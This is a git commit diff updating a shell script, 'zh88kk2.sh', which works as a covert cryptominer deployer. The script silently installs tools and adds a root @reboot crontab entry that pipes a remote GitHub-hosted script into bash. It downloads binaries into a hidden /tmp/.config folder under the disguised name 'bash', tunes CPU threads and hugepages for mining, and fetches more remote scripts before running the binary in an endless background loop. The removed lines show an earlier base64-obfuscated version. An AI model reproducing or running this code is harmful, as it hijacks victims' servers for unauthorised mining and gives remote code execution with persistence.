4ac6747732f87525359af83a829ddadc96c7ca23
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-12-25 15:18:20 +0800

    Update zh88kk2.sh

--- zh88kk2.sh
+++ zh88kk2.sh
@@ -1,31 +1,57 @@
 #!/bin/bash
-# Debian12+
-sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
-sudo apt -qqy install wget procps icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps icu-devtools netcat-traditional >/dev/null 2>&1
 
 mode="${1:-0}"
-src="https://raw.githubusercontent.com/army2mil/njabscb/main"
-[ -f "/etc/crontab" ] && sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget --no-check-certificate -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+work="/tmp/.config"
+src="https://raw.githubusercontent.com/hanrzme/qiyywnbc/main"
+hugepage="128"
 
-name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
-[ -n "$name" ] || name="NULL"
-name="${name}"
+RandString() {
+  n="${1:-2}"; s="${2:-}"; [ -n "$s" ] && s="${s}_"; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
+}
 
-cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
-[ -n "$cores" ] && rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
+# Debian12+
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional >/dev/null 2>&1
 
-mkdir -p "/tmp/.config"
-wget --no-check-certificate -qO "/tmp/.config/config.json" "${src}/z.json"
-wget --no-check-certificate -qO "/tmp/.config/bash" "${src}/bash"
-chmod -R 777 "/tmp/.config"
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+[ -n "$cores" ] || cores=1
+addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
+[ -n "$addr" ] || addr="NULL"
+name=`RandString 2 c${cores}_${addr}`;
 
-[ -f "/tmp/.config/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "/tmp/.config/config.json"
-[ -f "/tmp/.config/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "/tmp/.config/config.json"
+[ "$cores" -gt "2" ] && rx="[`seq -s ', ' 0 $((cores - 2))`]" || rx=""
+rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
+[ -n "$rxName" ] || rxName="$name"
 
-###bash -c "ping aws.amazon.com" >/dev/null 2>&1 &
 
+# if [ "$mode" == "1" ]; then
+#   bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
+#   [ "$cores" == "2" ] && cores="1";
+# fi
+
+
+sudo sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1 || sysctl -w vm.panic_on_oom=1 >/dev/null 2>&1
+sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1
+sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src}/q.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1
+
+
+rm -rf "${work}"; mkdir -p "${work}"
+wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
+wget --no-check-certificate -qO "${work}/bash" "${src}/q"
+wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
+wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
+chmod -R 777 "${work}"
+[ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
+[ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
+[ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
+[ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
+
+sh <(wget --no-check-certificate -qO- ${src}/check.sh) >/dev/null 2>&1 &
+sh <(wget --no-check-certificate -qO- ${src}/epoch.sh) >/dev/null 2>&1 &
+
+cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
 if [ "$mode" == "0" ]; then
-  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d) &
+  sh <(echo "$cmd") >/dev/null 2>&1 &
 else
-  /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d)
+  sh <(echo "$cmd")
 fi
